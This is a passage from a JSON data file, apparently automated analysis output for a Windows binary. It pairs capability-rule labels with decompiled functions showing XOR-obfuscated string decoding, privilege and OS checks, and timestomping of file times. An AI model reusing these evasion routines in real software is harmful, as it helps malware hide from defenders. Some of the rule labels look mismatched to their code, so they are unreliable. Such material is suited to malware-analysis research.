lpFileName);\n            (*pcVar6)(uVar1);\n        }\n    }\n    if (var_34h != 0) {\n        uVar1 = (*pcVar5)(0, var_34h);\n        (*pcVar6)(uVar1);\n    }\n    return iVar7;\n}\n",
        "token_count": 1810
    },
    "00401b20": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00401b20(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar4 = -1;\n    iVar3 = 0;\n    var_10h = param_2 * 10;\n    var_ch = param_1;\n    do {\n        iVar1 = var_10h;\n        var_4h = 0;\n        var_8h = 0;\n        puVar5 = &var_18h;\n        for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        iVar1 = fcn.00406d92(iVar1, 0, &var_8h, &var_4h);\n        if (iVar1 == 0) {\n            if (var_4h == var_8h) {\n                if (var_18h == 4) {\n                    iVar4 = *var_14h;\n                }\n                fcn.0040625c();\n            }\n            if (iVar4 != -1) {\n                return iVar4;\n            }\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n        }\n        iVar3 = iVar3 + 1;\n        if (4 < iVar3) {\n            return iVar4;\n        }\n    } while( true );\n}\n",
        "token_count": 398
    },
    "00405297": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405297(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    *0x41cb30 = 1;\n    fcn.0040278c(param_1);\n    fcn.00404a74();\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(*0x41cb38);\n    if (iVar1 != -1) {\n        fcn.0040fddc();\n    }\n    fcn.00404e07();\n    (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    fcn.00404d12();\n    return;\n}\n",
        "token_count": 138
    },
    "00405e58": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405e58(int32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (param_1 != 0) {\n        if (param_2 == -1) {\n            param_2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n        }\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, param_2 + 1);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if ((iVar2 != 0) &&\n           (iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, param_2, iVar2, param_2 + 1, 0, 0), \n           iVar3 != 0)) {\n            var_4h = fcn.00405d90();\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 287
    },
    "0040f720": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040f720(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar7;\n    uint var_ch;\n    uint var_8h;\n    int32_t lpNumberOfBytesRead;\n    \n    iVar7 = 0;\n    iVar2 = fcn.0040f6ae();\n    if (iVar2 != 0) {\n        in_ECX = iVar2;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0x80000000, 1, 0, 3, 0x80, 0);\n    if (iVar3 != -1) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetFileSize)(iVar3, 0);\n        if (iVar4 == 0) {\n            iVar4 = 0xe8;\n            goto code_r0x0040f7c2;\n        }\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar4 + 2);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n        if (iVar7 != 0) {\n            iVar5 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar3, iVar7, iVar4, &lpNumberOfBytesRead, 0);\n            if (iVar5 != 0) {\n                if (iVar4 == lpNumberOfBytesRead) {\n                    *(iVar4 + iVar7) = 0;\n                    *in_EDX = iVar7;\n                    *arg_8h = iVar4;\n                    iVar4 = 0;\n                }\n                else {\n                    iVar4 = 0x1e;\n                }\n                goto code_r0x0040f7c2;\n            }\n        }\n    }\n    iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\ncode_r0x0040f7c2:\n    if (iVar3 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    if ((iVar7 != 0) && (iVar4 != 0)) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n        (*pcVar1)(uVar6);\n    }\n    if (iVar2 != 0) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*pcVar1)(uVar6);\n    }\n    return iVar4;\n}\n",
        "token_count": 614
    },
    "0040f804": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040f804(uint lpLastWriteTime)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint in_EDX;\n    code *pcVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_4fh;\n    uint var_4bh;\n    uint var_47h;\n    uint var_43h;\n    uint var_3fh;\n    uint var_3bh;\n    uint var_37h;\n    uint var_33h;\n    ushort var_2fh;\n    uchar var_2dh;\n    uint lpSystemTime;\n    uint var_26h;\n    int16_t var_22h;\n    int16_t var_20h;\n    int16_t var_1eh;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint lpLastAccessTime;\n    uint lpCreationTime;\n    uint hHeap;\n    \n    iVar2 = *0x41caac;\n    lpLastAccessTime = in_EDX;\n    (*_sym.imp.KERNEL32.dll_GetSystemTime)(&lpSystemTime);\n    pcVar6 = _sym.imp.KERNEL32.dll_SystemTimeToFileTime;\n    hHeap = 0x3b;\n    uVar7 = iVar2 * 0x19660d + 0x3c6ef35f;\n    lpSystemTime._2_2_ = uVar7 % 0xb + 1;\n    uVar7 = uVar7 * 0x19660d + 0x3c6ef35f;\n    uVar5 = uVar7 * 0x19660d + 0x3c6ef35f;\n    var_26h._0_2_ = uVar7 % 0x1b + 1;\n    var_26h._2_2_ = uVar5 % 0x16 + 1;\n    uVar7 = uVar5 * 0x19660d + 0x3c6ef35f;\n    uVar5 = uVar7 * 0x19660d + 0x3c6ef35f;\n    var_22h = uVar7 % 0x3b + 1;\n    var_20h = uVar5 % 0x3b + 1;\n    lpSystemTime._0_2_ = lpSystemTime + -1;\n    var_1eh = (uVar5 * 0x17385ca9 + 0x47502932) % 0x3e6 + 1;\n    (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime);\n    (*pcVar6)(&lpSystemTime);\n    (*pcVar6)(&lpSystemTime, lpLastWriteTime);\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_60h = 0x342f676c;\n    var_5ch = 0x6727653d;\n    var_58h = 0x653d343c;\n    var_54h._0_1_ = hHeap;\n    stack0xffffffa9 = 0x8347d67;\n    var_4fh = 0x21673a65;\n    var_4bh = 0x3d652734;\n    var_47h = 0x39343d67;\n    var_43h = 0x6a677a65;\n    var_3fh = 0x2a650834;\n    var_3bh = 0x30343567;\n    var_37h = 0x3d676765;\n    var_33h = 0x2c652c34;\n    var_2fh = 0x5867;\n    var_2dh = 0x34;\n    var_1ch = 0x34586749;\n    var_18h._0_2_ = 0x6554;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x69);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar8 = 0;\n    var_14h = &var_60h - iVar2;\n    do {\n        iVar3 = (*pcVar6)();\n        if (iVar3 != 0xbb2a30) {\n            hHeap = 6;\n            *(iVar8 + iVar2) = *(&var_1ch + iVar8 % 6) ^ (iVar8 + iVar2)[var_14h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x34);\n    iVar8 = fcn.0040f6ae();\n    if (iVar8 != 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(iVar8, 0x80000000, 1, 0, 3, 0, 0);\n        if ((iVar3 != 0) && (iVar3 != -1)) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetFileTime)(iVar8, lpCreationTime, lpLastAccessTime, lpLastWriteTime);\n            if (iVar4 == 0) {\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpCreationTime);\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastAccessTime);\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastWriteTime);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n        }\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    uVar1 = (*pcVar6)(0, iVar2);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return 0;\n}\n",
        "token_count": 1393
    },
    "0040fa39": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040fa39(uint nNumberOfBytesToWrite)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    uint lpNumberOfBytesWritten;\n    uint lpBuffer;\n    \n    lpBuffer = in_EDX;\n    iVar1 = fcn.0040f6ae();\n    if (iVar1 != 0) {\n        in_ECX = iVar1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0xc0000000, 0, 0, 4, 0x80, 0);\n    if (iVar2 == -1) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        fcn.0040f804(&lpLastWriteTime);\n        iVar4 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar2, lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0);\n        if (iVar4 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_SetEndOfFile)(iVar2);\n            uVar3 = 0;\n        }\n        (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    if (iVar1 != 0) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    }\n    return uVar3;\n}\n",
        "token_count": 430
    },
    "00405f38": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00405f38(uint param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint pSid;\n    uint pIdentifierAuthority;\n    uchar var_10h;\n    uchar var_fh;\n    int32_t cbSid;\n    int32_t nSize;\n    uint32_t var_4h;\n    \n    *0x41cb50 = param_1;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    *0x41cb40 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    *0x41cb3c = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    fcn.0040cdc7();\n    fcn.00405ecf();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x20);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    *0x41cb70 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    cbSid = 5;\n    if (*0x41cb70 != 0) {\n        nSize = 0x10;\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetComputerNameW)(*0x41cb70, &nSize);\n        if (iVar4 == 0) {\n            var_28h = 0x47093006;\n            var_24h = 0x477e532f;\n            var_20h = 0x30046408;\n            var_1ch._0_2_ = 0x4747;\n            pIdentifierAuthority = 0x47473053;\n            var_10h = 100;\n            uVar3 = (*pcVar2)(8, 0x1d);\n            iVar4 = (*pcVar1)(uVar3);\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n                if (iVar5 != 0xa1a1f) {\n                    *(iVar6 + iVar4) = *(&pIdentifierAuthority + iVar6 % cbSid) ^ (iVar6 + iVar4)[&var_28h - iVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0xe);\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(*0x41cb70, iVar4);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        fcn.00405b5b();\n    }\n    var_fh = 5;\n    pIdentifierAuthority = 0;\n    var_10h = 0;\n    var_4h = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                       (&pIdentifierAuthority, 2, 0x20, 0x220, 0, 0, 0, 0, 0, 0, &nSize);\n    pcVar1 = _sym.imp.ADVAPI32.dll_CheckTokenMembership;\n    if (var_4h != 0) {\n        iVar4 = (*_sym.imp.ADVAPI32.dll_CheckTokenMembership)(0, nSize, &var_4h);\n        var_4h = var_4h & -(iVar4 != 0);\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(nSize);\n        if (var_4h != 0) {\n            if (*0x41cb40 < 6) {\n                return 0;\n            }\n            fcn.004061b2();\n            goto code_r0x004060c9;\n        }\n    }\n    nSize = 0;\n    cbSid = 0xc;\n    nSize = (*_sym.imp.ADVAPI32.dll_CreateWellKnownSid)(0x27, 0, &pSid, &cbSid);\n    if (nSize != 0) {\n        (*pcVar1)(0, &pSid, &nSize);\n    }\ncode_r0x004060c9:\n    if (5 < *0x41cb40) {\n        fcn.004060e2();\n    }\n    return 0;\n}\n",
        "token_count": 1009
    },
    "00407b94": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00407b94(uchar *param_1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int16_t *piVar7;\n    uchar *puVar8;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uchar *var_4h;\n    \n    if (param_1 != NULL) {\n        puVar8 = param_1;\n        for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        var_4h = param_1;\n        cVar2 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n        if (cVar2 == '\\x05') {\n            var_24h = 0x682d540b;\n            var_20h = 0x42205810;\n            var_1ch = 0x5439761f;\n            var_18h = 0x58136830;\n            var_14h._0_2_ = 0x4254;\n            var_10h = 0x68425458;\n            var_ch._0_2_ = CONCAT11(var_ch._1_1_, 0x76);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n            piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetShellWindow)();\n                if (iVar5 != 0x5e13db) {\n                    var_8h = 5;\n                    *(iVar6 + piVar4) = *(&var_10h + iVar6 % 5) ^ (iVar6 + piVar4)[&var_24h - piVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x12);\n            piVar7 = piVar4;\n            do {\n                iVar1 = *piVar7;\n                *((var_4h - piVar4) + piVar7) = iVar1;\n                piVar7 = piVar7 + 1;\n            } while (iVar1 != 0);\n        }\n        else {\n            var_4ch = 0x53006f62;\n            var_48h = 0x6f455154;\n            var_44h = 0x51535318;\n            var_40h = 0x530a6f43;\n            var_3ch = 0x6f70516e;\n            var_38h = 0x5142531f;\n            var_34h = 0x530e6f75;\n            var_30h = 0x6f505146;\n            var_2ch = 0x515d5323;\n            var_28h = 0x536f6f46;\n            var_10h = 0x536f6f31;\n            var_ch._0_2_ = 0x5132;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n            piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetCapture)();\n                if (iVar5 != 0xf07861) {\n                    var_8h = 6;\n                    *(iVar6 + piVar4) = *(&var_10h + iVar6 % 6) ^ (iVar6 + piVar4)[&var_4ch - piVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x28);\n            piVar7 = piVar4;\n            do {\n                iVar1 = *piVar7;\n                *((var_4h - piVar4) + piVar7) = iVar1;\n                piVar7 = piVar7 + 1;\n            } while (iVar1 != 0);\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return;\n}\n",
        "token_count": 1103
    },
    "00405ecf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00405ecf(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    uint var_48h;\n    uint var_24h;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_14h;\n    uint lpModuleName;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    lpModuleName = 0x6e72656b;\n    var_ch = 0x32336c65;\n    var_8h = 0x6c6c642e;\n    var_4h._0_1_ = 0;\n    var_24h = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._0_4_;\n    uStack36 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._4_4_;\n    uStack32 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._8_4_;\n    uStack28 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._12_4_;\n    var_14h = 0x6f666e;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(&lpModuleName, &var_24h);\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if (pcVar2 != NULL) {\n        (*pcVar2)(&var_48h);\n        if (var_48h == 9) {\n            *0x41cb44 = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 362
    },
    "0040ae2a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0040ae2a(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpLibFileName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_20h = 0x1b401e52;\n    var_1ch = 0x48003002;\n    var_18h._0_2_ = CONCAT11(var_18h._1_1_, 0x36);\n    var_14h = 0x7a367a33;\n    var_10h._0_2_ = 0x5972;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 10);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar6 = 0;\n    lpLibFileName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n        if (iVar3 != 0xe6716a) {\n            var_8h = 6;\n            *(iVar6 + iVar2) = *(&var_14h + iVar6 % 6) ^ (iVar6 + iVar2)[&var_20h - iVar2];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 9);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*0x41cd94 == NULL) {\n        var_28h = 0x36411717;\n        var_24h = 0x47282935;\n        var_20h = 0x730332c;\n        var_1ch = 0x77602c5d;\n        var_18h._0_2_ = 0x3258;\n        var_14h = 0x42326e44;\n        var_10h._0_2_ = CONCAT11(var_10h._1_1_, 0x50);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar3 = 0;\n        var_8h = &var_28h - iVar6;\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n            iVar2 = lpLibFileName;\n            if (iVar4 != 0xe9cd63) {\n                var_8h = 5;\n                *(iVar3 + iVar6) = *(&var_14h + iVar3 % 5) ^ (iVar3 + iVar6)[&var_28h - iVar6];\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < 0x12);\n        uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n        *0x41cd94 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    (**0x41cd94)(&var_4h, 4);\n    if (var_4h < 0) {\n        var_4h = -var_4h;\n    }\n    iVar6 = var_4h;\n    uVar1 = (*pcVar5)(0, iVar2);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return iVar6;\n}\n",
        "token_count": 903
    },
    "004061b2": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint fcn.004061b2(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint ReturnLength;\n    uint TokenInformation;\n    uint TokenHandle;\n    \n    TokenInformation = 0;\n    if (*0x41cb40 == 6) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x20008, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar1);\n        if (iVar2 != 0) {\n            (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x14, &TokenInformation, 4, &ReturnLength);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    return TokenInformation;\n}\n",
        "token_count": 176
    },
    "00406d92": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.00406d92(uint arg_8h, uint arg_ch, uint32_t *arg_10h, uint32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    uint *in_EDX;\n    uint var_4h;\n    \n    do {\n        iVar1 = fcn.004065b9(arg_8h, arg_ch, arg_10h, arg_14h, *in_EDX);\n        if (iVar1 != 6) break;\n    } while (*arg_14h <= *arg_10h && *arg_10h != *arg_14h);\n    if (iVar1 != 0) {\n        fcn.0040625c();\n    }\n    return iVar1;\n}\n",
        "token_count": 182
    },
    "0040872c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0040872c(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_30h;\n    uint var_2ch;\n    uint var_25h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_4h = 0;\n    var_30h = 0x7164127;\n    var_2ch._0_2_ = 0x582e;\n    var_10h = 6;\n    var_2ch._2_1_ = 6;\n    stack0xffffffd3 = 0xd361a11;\n    var_25h._0_1_ = 0x57;\n    var_25h._1_1_ = 0x32;\n    var_25h._2_2_ = 0x591b;\n    var_20h = 0x6841326e;\n    var_1ch._0_2_ = CONCAT11(var_1ch._1_1_, 0x59);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_ch = &var_30h - iVar4;\n    var_14h = iVar4;\n    do {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar5 != 0xa0a260) {\n            var_8h = 5;\n            *(iVar7 + iVar4) = *(&var_20h + iVar7 % 5) ^ (iVar7 + iVar4)[var_ch];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xf);\n    var_30h = 0x3d143d22;\n    var_2ch._0_2_ = 0x3a5c;\n    var_2ch._2_1_ = 0x7a;\n    stack0xffffffd3 = 0x5537486a;\n    var_25h._0_1_ = 0x3a;\n    var_25h._1_1_ = 0x49;\n    var_20h = 0x53665849;\n    var_1ch._0_2_ = 0x5639;\n    uVar3 = (*pcVar1)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_ch = &var_30h - iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n        iVar5 = var_14h;\n        if (iVar6 != 0xcdeae0) {\n            *(iVar7 + iVar4) = *(&var_20h + iVar7 % var_10h) ^ (iVar7 + iVar4)[&var_30h - iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xd);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4, var_14h);\n    *0x41d1f0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    if (*0x41d1f0 != NULL) {\n        iVar7 = (**0x41d1f0)(var_18h, &var_4h);\n        var_4h = -(iVar7 != 0) & var_4h;\n    }\n    uVar2 = var_4h;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    (*pcVar1)(uVar3);\n    return uVar2;\n}\n",
        "token_count": 1016
    },
    "0040dfff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
